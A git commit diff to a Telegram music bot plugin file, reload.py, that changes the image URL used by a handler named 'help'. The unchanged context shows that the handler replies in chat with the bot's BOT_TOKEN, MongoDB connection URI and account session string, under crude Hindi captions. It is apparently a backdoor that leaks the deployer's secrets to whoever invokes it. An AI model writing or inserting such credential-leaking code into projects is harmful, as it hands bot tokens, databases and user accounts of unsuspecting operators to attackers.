621dd2d92881ed6ff810a93f22582346e6ed578c
Rishabh <152057079+Rishabhopi@users.noreply.github.com>
2024-10-28 10:35:44 +0530

    Update reload.py

--- SHUKLAMUSIC/plugins/tools/reload.py
+++ SHUKLAMUSIC/plugins/tools/reload.py
@@ -110,7 +110,7 @@ async def restartbot(client, message: Message, _):
 )
 async def help(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+        photo=f"https://envs.sh/Amn.jpg",
         caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
     )
 
